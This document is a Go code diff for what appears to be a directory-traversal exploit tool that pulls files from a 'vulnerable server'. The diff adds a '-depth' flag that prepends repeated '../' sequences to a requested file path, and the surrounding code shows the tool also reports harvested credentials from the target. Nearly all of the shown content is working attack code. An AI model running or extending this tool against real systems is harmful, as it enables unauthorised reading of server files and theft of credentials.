@@ -104,8 +104,18 @@ func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
 //  err - error. error or nil.
 //
 // ============================================================
-func (c *Client) GetFile(filename string) (contents []byte, err error) {
-	const dirwalk string = ".."
+func (c *Client) GetFile(filename string, depth int) (contents []byte, err error) {
+	var dirwalk string
+
+	if depth < 1 {
+		return nil, errors.New("depth must be 1 or larger")
+	}
+
+	for i := 0; i < depth; i++ {
+		dirwalk = fmt.Sprintf("%s../", dirwalk)
+	}
+	dirwalk = dirwalk[:len(dirwalk)-1]
+
 	var route string = fmt.Sprintf("%s/%s", dirwalk, filename)
 
 	contents, err = c.GetBodyContent(route)
@@ -404,6 +414,7 @@ func main() {
 	var err error
 
 	var targetfile string
+	var depth int
 
 	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
 	flag.IntVar(&port, "p", 80, "port to communicate with target on")
@@ -411,6 +422,7 @@ func main() {
 	flag.StringVar(&targetfile, "file", "", "file to pull down from vulnerable server")
 	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
 	flag.BoolVar(&secure, "secure", false, "use HTTPS instead of HTTP")
+	flag.IntVar(&depth, "depth", 1, "traversal depth to search for file")
 	flag.Parse()
 
 	success, message := ValidatePort(port)
@@ -432,6 +444,7 @@ func main() {
 	}
 
 	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
+	InfMsg(fmt.Sprintf("Traversal Depth: %d", depth))
 	PrintChar('=', 60)
 
 	//============================================================
@@ -467,7 +480,7 @@ func main() {
 		}
 		SucMsg(fmt.Sprintf("Creds Found: \"%s:%s\"", creds.Username, creds.Password))
 	} else {
-		contents, err = client.GetFile(targetfile)
+		contents, err = client.GetFile(targetfile, depth)
 		if err != nil {
 			ErrMsg(err.Error())
 			os.Exit(1)
